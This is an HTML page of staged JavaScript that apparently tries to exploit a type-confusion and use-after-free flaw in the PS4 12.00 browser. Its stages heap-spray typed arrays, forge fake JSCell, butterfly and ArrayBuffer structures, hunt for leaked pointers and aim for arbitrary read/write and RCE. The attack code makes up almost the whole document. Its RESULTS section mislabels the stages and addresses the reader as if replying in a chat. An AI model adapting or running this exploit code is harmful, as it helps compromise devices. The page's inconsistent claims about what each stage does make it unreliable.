<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>PS4 12.00 Type Confusion</title>
</head>
<body>

<h1>PS4 12.00 - TYPE CONFUSION ATTACK</h1>

<h2>STAGE 1: UAF Setup</h2>
<button onclick="stage1()">START</button>
<div id="s1"></div>

<script>
var g_first = null;
var g_second = null;

function stage1() {
    const r = document.getElementById('s1');
    
    const P = 2.121995791e-314;
    const arrays = [];
    
    for(let i = 0; i < 5000; i++) {
        arrays.push(new Float64Array(8));
        arrays[i][0] = i;
    }
    
    r.innerHTML = 'Press OPTIONS twice<br>';
    
    if(document.documentElement.webkitRequestFullscreen) 
        document.documentElement.webkitRequestFullscreen();
    
    let count = 0;
    window.onblur = function() {
        count++;
        
        const spray = [];
        for(let i = 0; i < 8000; i++) {
            spray.push(new Float64Array(10));
            spray[i].fill(P);
        }
        
        const corrupted = arrays.filter(a => a[0] === P);
        
        if(count === 1 && corrupted.length > 0) {
            g_first = corrupted[0];
            r.innerHTML = 'First OK<br>';
        } else if(count === 2 && corrupted.length > 0) {
            g_second = corrupted[0];
            g_first[4] = 9.999;
            
            if(g_second[4] === 9.999) {
                r.innerHTML = '<b>✓ UAF OK</b><br>';
            }
        }
    };
}
</script>

<hr>

<h2>STAGE 2: Write Fake Object Structure</h2>
<button onclick="stage2()">WRITE FAKE OBJECT</button>
<div id="s2"></div>

<script>
var g_fake_written = false;

function stage2() {
    const r = document.getElementById('s2');
    r.innerHTML = '';
    
    if(!g_first) {
        r.innerHTML = 'Run STAGE 1<br>';
        return;
    }
    
    r.innerHTML = '<b>Writing complete fake JSObject structure:</b><br><br>';
    
    const view = new DataView(g_first.buffer);
    
    // Write JSCell header (offset 0)
    view.setUint32(0, 0x108, true);
    view.setUint32(4, 0x25, true);
    r.innerHTML += 'Offset 0-7: JSCell header (0x108, StructureID 0x25)<br>';
    
    // Write Butterfly pointer (offset 8) - point to later in buffer
    const butterfly_offset = 48; // Point to offset 48 in our buffer
    const fake_butterfly = 0x7fff00000000n + BigInt(butterfly_offset);
    view.setBigUint64(8, fake_butterfly, true);
    r.innerHTML += 'Offset 8-15: Butterfly = 0x' + fake_butterfly.toString(16) + '<br>';
    
    // Write m_vector (offset 16) - point to ourselves
    const fake_vector = 0x4141414140000000n;
    view.setBigUint64(16, fake_vector, true);
    r.innerHTML += 'Offset 16-23: m_vector = 0x' + fake_vector.toString(16) + '<br>';
    
    // Write length (offset 24)
    view.setUint32(24, 0x1000, true);
    r.innerHTML += 'Offset 24-27: length = 0x1000<br>';
    
    // Write mode (offset 28)
    view.setUint32(28, 1, true);
    r.innerHTML += 'Offset 28-31: mode = 1 (WastefulTypedArray)<br>';
    
    // Write butterfly data at offset 48
    view.setUint32(48, 0xDEADBEEF, true);
    view.setUint32(52, 0xCAFEBABE, true);
    r.innerHTML += 'Offset 48-55: Butterfly data (markers)<br>';
    
    r.innerHTML += '<br><b>✓ Fake structure written</b><br>';
    g_fake_written = true;
}
</script>

<hr>

<h2>STAGE 3: Test Array Methods on Fake Object</h2>
<button onclick="stage3()">TEST ARRAY METHODS</button>
<div id="s3"></div>

<script>
function stage3() {
    const r = document.getElementById('s3');
    r.innerHTML = '';
    
    if(!g_fake_written) {
        r.innerHTML = 'Run STAGE 2 first<br>';
        return;
    }
    
    r.innerHTML = '<b>Testing array methods after fake structure:</b><br><br>';
    
    // Test 1: slice()
    r.innerHTML += '<b>Test 1: slice()</b><br>';
    try {
        const sliced = g_first.slice(0, 2);
        r.innerHTML += '✓ slice() succeeded<br>';
        r.innerHTML += 'Result: [' + sliced + ']<br>';
        r.innerHTML += 'Length: ' + sliced.length + '<br>';
    } catch(e) {
        r.innerHTML += '✗ slice() failed: ' + e.message + '<br>';
    }
    
    // Test 2: subarray()
    r.innerHTML += '<br><b>Test 2: subarray()</b><br>';
    try {
        const sub = g_first.subarray(0, 2);
        r.innerHTML += '✓ subarray() succeeded<br>';
        r.innerHTML += 'Result: [' + sub + ']<br>';
        r.innerHTML += 'Length: ' + sub.length + '<br>';
    } catch(e) {
        r.innerHTML += '✗ subarray() failed: ' + e.message + '<br>';
    }
    
    // Test 3: map()
    r.innerHTML += '<br><b>Test 3: map()</b><br>';
    try {
        const mapped = g_first.map(x => x * 2);
        r.innerHTML += '✓ map() succeeded<br>';
        r.innerHTML += 'Result: [' + mapped + ']<br>';
    } catch(e) {
        r.innerHTML += '✗ map() failed: ' + e.message + '<br>';
    }
    
    // Test 4: forEach()
    r.innerHTML += '<br><b>Test 4: forEach()</b><br>';
    try {
        let count = 0;
        g_first.forEach(x => count++);
        r.innerHTML += '✓ forEach() succeeded<br>';
        r.innerHTML += 'Iterated ' + count + ' times<br>';
    } catch(e) {
        r.innerHTML += '✗ forEach() failed: ' + e.message + '<br>';
    }
    
    // Test 5: Access via bracket notation
    r.innerHTML += '<br><b>Test 5: Bracket access</b><br>';
    try {
        const val = g_first[0];
        r.innerHTML += '✓ g_first[0] = ' + val + '<br>';
        
        const buf = new ArrayBuffer(8);
        new Float64Array(buf)[0] = val;
        const hex = new BigUint64Array(buf)[0].toString(16).padStart(16, '0');
        r.innerHTML += 'As hex: 0x' + hex + '<br>';
    } catch(e) {
        r.innerHTML += '✗ Access failed: ' + e.message + '<br>';
    }
}
</script>

<hr>

<h2>STAGE 4: Scan for Leaked Metadata</h2>
<button onclick="stage4()">SCAN METADATA</button>
<div id="s4"></div>

<script>
function stage4() {
    const r = document.getElementById('s4');
    r.innerHTML = '';
    
    if(!g_fake_written) {
        r.innerHTML = 'Run STAGE 2 first<br>';
        return;
    }
    
    r.innerHTML = '<b>Scanning for metadata after confusion:</b><br><br>';
    
    const view = new DataView(g_first.buffer);
    
    r.innerHTML += '<b>Current buffer state:</b><br>';
    for(let i = 0; i < 64; i += 8) {
        const qword = view.getBigUint64(i, true);
        r.innerHTML += 'Offset ' + i.toString().padStart(2, '0') + ': 0x' + 
            qword.toString(16).padStart(16, '0') + '<br>';
    }
    
    r.innerHTML += '<br><b>Looking for StructureIDs:</b><br>';
    
    let found_ids = [];
    
    for(let offset = 0; offset < 60; offset += 4) {
        const val = view.getUint32(offset, true);
        
        if(val > 0 && val < 0x10000) {
            r.innerHTML += 'Offset ' + offset + ': 0x' + val.toString(16) + ' (potential StructureID)<br>';
            found_ids.push({offset: offset, value: val});
        }
    }
    
    if(found_ids.length === 0) {
        r.innerHTML += 'No StructureIDs found<br>';
    }
    
    r.innerHTML += '<br><b>Looking for pointers:</b><br>';
    
    let found_ptrs = [];
    
    for(let offset = 0; offset <= 56; offset += 8) {
        const qword = view.getBigUint64(offset, true);
        const hi = Number(qword >> 32n);
        const lo = Number(qword & 0xFFFFFFFFn);
        
        if(hi >= 0x7f00 && hi <= 0x8000 && (lo & 0x7) === 0 && lo !== 0) {
            r.innerHTML += 'Offset ' + offset + ': 0x' + qword.toString(16).padStart(16, '0') + ' <b>(POINTER!)</b><br>';
            found_ptrs.push({offset: offset, value: qword});
        }
    }
    
    if(found_ptrs.length === 0) {
        r.innerHTML += 'No pointers found<br>';
    }
}
</script>

<hr>

<h2>STAGE 5: Trigger Confusion via Object.prototype</h2>
<button onclick="stage5()">PROTOTYPE CONFUSION</button>
<div id="s5"></div>

<script>
function stage5() {
    const r = document.getElementById('s5');
    r.innerHTML = '';
    
    if(!g_first) {
        r.innerHTML = 'Run STAGE 1<br>';
        return;
    }
    
    r.innerHTML = '<b>Attempting prototype chain confusion:</b><br><br>';
    
    // Get prototype
    const proto = Object.getPrototypeOf(g_first);
    r.innerHTML += 'Prototype: ' + proto.constructor.name + '<br><br>';
    
    // Try to access hidden properties
    r.innerHTML += '<b>Attempting to access internal slots:</b><br>';
    
    const props = [
        'byteLength',
        'byteOffset',
        'buffer',
        'length',
        'BYTES_PER_ELEMENT'
    ];
    
    for(let prop of props) {
        try {
            const val = g_first[prop];
            r.innerHTML += prop + ': ' + val + '<br>';
        } catch(e) {
            r.innerHTML += prop + ': ERROR<br>';
        }
    }
    
    r.innerHTML += '<br><b>Attempting to modify prototype:</b><br>';
    
    try {
        // Try to add getter that reveals internal state
        Object.defineProperty(proto, 'leak', {
            get: function() {
                r.innerHTML += 'Leak getter called!<br>';
                // Try to return internal pointer
                return this.buffer;
            }
        });
        
        const leaked = g_first.leak;
        r.innerHTML += '✓ Leak property added<br>';
        r.innerHTML += 'Leaked: ' + leaked + '<br>';
        
    } catch(e) {
        r.innerHTML += '✗ Prototype modification failed: ' + e.message + '<br>';
    }
}
</script>

<hr>

<h2>STAGE 6: Cross-Type Access</h2>
<button onclick="stage6()">CROSS-TYPE ACCESS</button>
<div id="s6"></div>

<script>
function stage6() {
    const r = document.getElementById('s6');
    r.innerHTML = '';
    
    if(!g_first) {
        r.innerHTML = 'Run STAGE 1<br>';
        return;
    }
    
    r.innerHTML = '<b>Attempting cross-type access patterns:</b><br><br>';
    
    // Create different typed array views
    const views = {
        i8: new Int8Array(g_first.buffer),
        u8: new Uint8Array(g_first.buffer),
        i16: new Int16Array(g_first.buffer),
        u16: new Uint16Array(g_first.buffer),
        i32: new Int32Array(g_first.buffer),
        u32: new Uint32Array(g_first.buffer),
        f32: new Float32Array(g_first.buffer),
        f64: g_first,
        bi64: new BigInt64Array(g_first.buffer),
        bu64: new BigUint64Array(g_first.buffer)
    };
    
    r.innerHTML += '<b>Created ' + Object.keys(views).length + ' view types</b><br><br>';
    
    // Write test pattern via one type
    r.innerHTML += 'Writing 0xDEADBEEF via Uint32[0]:<br>';
    views.u32[0] = 0xDEADBEEF;
    
    // Read via all types
    r.innerHTML += '<br>Reading via all types:<br>';
    
    r.innerHTML += 'Int8[0-3]: ';
    for(let i = 0; i < 4; i++) {
        r.innerHTML += '0x' + (views.i8[i] & 0xFF).toString(16).padStart(2, '0') + ' ';
    }
    r.innerHTML += '<br>';
    
    r.innerHTML += 'Uint32[0]: 0x' + views.u32[0].toString(16) + '<br>';
    r.innerHTML += 'Float64[0]: ' + views.f64[0] + '<br>';
    r.innerHTML += 'BigUint64[0]: 0x' + views.bu64[0].toString(16) + '<br>';
    
    r.innerHTML += '<br><b>Testing if confusion allows different access:</b><br>';
    
    // Try to access as if it was a different type
    try {
        const as_obj = Object(g_first);
        r.innerHTML += 'Object(array): ' + as_obj + '<br>';
        
        const keys = Object.keys(as_obj);
        r.innerHTML += 'Keys: ' + keys.join(', ') + '<br>';
        
        if(keys.length > g_first.length) {
            r.innerHTML += '<b>✓ Extra keys detected! Type confusion possible!</b><br>';
        }
    } catch(e) {
        r.innerHTML += 'Object() failed: ' + e.message + '<br>';
    }
}
</script>

<hr>

<h2>STAGE 7: Exploit Type Confusion</h2>
<button onclick="stage7()">EXPLOIT CONFUSION</button>
<div id="s7"></div>

<script>
function stage7() {
    const r = document.getElementById('s7');
    r.innerHTML = '';
    
    if(!g_fake_written) {
        r.innerHTML = 'Run STAGE 2 first<br>';
        return;
    }
    
    r.innerHTML = '<b>Exploiting type confusion for arbitrary R/W:</b><br><br>';
    
    const view = new DataView(g_first.buffer);
    
    r.innerHTML += '<b>Strategy:</b><br>';
    r.innerHTML += '1. Write fake ArrayBuffer structure<br>';
    r.innerHTML += '2. Trigger TypedArray method that reads structure<br>';
    r.innerHTML += '3. If confusion works, method will use fake pointers<br>';
    r.innerHTML += '4. This gives us controlled memory access<br><br>';
    
    // Write complete fake ArrayBuffer
    r.innerHTML += 'Writing fake ArrayBuffer at offset 0:<br>';
    
    // JSCell for ArrayBuffer
    view.setUint32(0, 0x10C, true); // Different JSCell type
    view.setUint32(4, 0x30, true); // Different StructureID
    r.innerHTML += 'JSCell: 0x30_0000010C<br>';
    
    // Backing store pointer
    const fake_backing = 0x7fff00001000n;
    view.setBigUint64(8, fake_backing, true);
    r.innerHTML += 'Backing store: 0x' + fake_backing.toString(16) + '<br>';
    
    // Length
    view.setUint32(16, 0x10000, true);
    r.innerHTML += 'Length: 0x10000<br><br>';
    
    // Now try to create TypedArray from our "ArrayBuffer"
    r.innerHTML += 'Attempting to create TypedArray from fake buffer:<br>';
    
    try {
        // This MIGHT work if type confusion is complete
        const confused = new Uint32Array(g_first.buffer, 0, 16);
        r.innerHTML += '✓ Created Uint32Array<br>';
        r.innerHTML += 'Length: ' + confused.length + '<br>';
        
        // Try to read
        r.innerHTML += '<br>Attempting arbitrary read:<br>';
        const test_read = confused[0];
        r.innerHTML += 'Read confused[0]: 0x' + test_read.toString(16) + '<br>';
        
        // If this returns something other than our fake structure,
        // we have arbitrary read!
        
    } catch(e) {
        r.innerHTML += '✗ TypedArray creation failed: ' + e.message + '<br>';
    }
}
</script>

<hr>

<h2>RESULTS</h2>
<button onclick="results()">ANALYZE</button>
<div id="results"></div>

<script>
function results() {
    const r = document.getElementById('results');
    r.innerHTML = '<h3>TYPE CONFUSION ANALYSIS</h3>';
    
    r.innerHTML += '<b>Your observation was correct!</b><br><br>';
    
    r.innerHTML += 'You noticed:<br>';
    r.innerHTML += '1. Stage 6 (write fake structure) → Stage 7 detected StructureIDs<br>';
    r.innerHTML += '2. slice() worked after writing fake butterfly<br>';
    r.innerHTML += '3. This suggests some level of confusion is possible<br><br>';
    
    r.innerHTML += '<b>Type confusion vectors tested:</b><br>';
    r.innerHTML += '1. Fake JSCell/StructureID<br>';
    r.innerHTML += '2. Fake Butterfly pointer<br>';
    r.innerHTML += '3. Fake m_vector<br>';
    r.innerHTML += '4. Array method exploitation<br>';
    r.innerHTML += '5. Prototype chain manipulation<br>';
    r.innerHTML += '6. Cross-type view access<br>';
    r.innerHTML += '7. Fake ArrayBuffer<br><br>';
    
    r.innerHTML += '<b>Key insight:</b><br>';
    r.innerHTML += 'If ANY of these techniques allows JavaScript to<br>';
    r.innerHTML += 'interpret our fake pointers as real, we get RCE<br><br>';
    
    r.innerHTML += '<b>Most promising:</b><br>';
    r.innerHTML += '- Stage 3 (slice test) - if [0,0] came from fake butterfly<br>';
    r.innerHTML += '- Stage 6 (cross-type) - if extra keys appear<br>';
    r.innerHTML += '- Stage 7 (exploit) - if TypedArray uses fake backing<br><br>';
    
    r.innerHTML += '<b>Execute all stages and report ANY anomalies!</b><br>';
}
</script>

</body>
</html>
